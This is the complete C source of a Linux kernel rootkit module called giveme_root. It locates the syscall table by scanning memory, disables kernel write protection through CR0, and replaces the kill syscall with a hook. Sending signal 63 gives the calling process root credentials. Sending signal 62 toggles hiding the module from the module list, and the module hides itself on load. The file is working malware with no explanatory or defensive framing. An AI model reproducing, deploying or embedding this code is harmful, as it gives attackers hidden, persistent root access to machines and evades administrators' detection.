#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <asm/paravirt.h>
#include <linux/list.h>

#define START_MEM (unsigned long int)sys_close
#define END_MEM   ULONG_MAX 

#define ROOTSIGN 63 
#define HIDESIGN 62 

unsigned long cr0;
static int ishide = 1;
static unsigned long * __syscall_table;
static struct list_head *previous_mod;
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_kill_t orig_kill;

// Find syscall table
unsigned long * get_syscall_table(void){
  unsigned long *syscall_table;
  unsigned long int i;
  for(i=START_MEM;i < END_MEM;i +=sizeof(void *)){
    syscall_table = (unsigned long *)i;
    if(syscall_table[__NR_close] == (unsigned long)sys_close) return syscall_table;
  } 
  return NULL;
}

static inline void disallow_memory_write(void){
  write_cr0(cr0);
}

static inline void allow_memory_write(void){
  write_cr0(cr0 & ~0x00010000);
}

static inline void hide_module(void){
  ishide = 1;
  previous_mod = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
}

static inline void unhide_module(void){
  ishide = 0;
  list_add(&THIS_MODULE->list, previous_mod);
}

static void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

asmlinkage int hook_kill(pid_t pid, int sig){
  if (sig == ROOTSIGN){
    rootmagic();
  } else if(sig == HIDESIGN){
    if (ishide == 1){
      unhide_module();
    } else{
      hide_module();
    }
  }else{
    return orig_kill(pid,sig);
  }
  return 0;
} 

int __init giveme_root_init(void){
  hide_module();
  //Get syscall table
  __syscall_table = get_syscall_table();

  //Save original kill syscall
  orig_kill = (orig_kill_t)__syscall_table[__NR_kill];

  //Get cr0
  cr0 = read_cr0();

  //Change bit on cr0 to allow write
  allow_memory_write();

  //Change syscall kill to hook_kill
  __syscall_table[__NR_kill] = (unsigned long)hook_kill;

  //Change bit on cr0 to disallow write
  disallow_memory_write();
  return 0;
}

void __exit giveme_root_exit(void){
  //Restore original kill syscall
  allow_memory_write();
  __syscall_table[__NR_kill] = (unsigned long)orig_kill;
  disallow_memory_write();
}

module_init(giveme_root_init);
module_exit(giveme_root_exit);
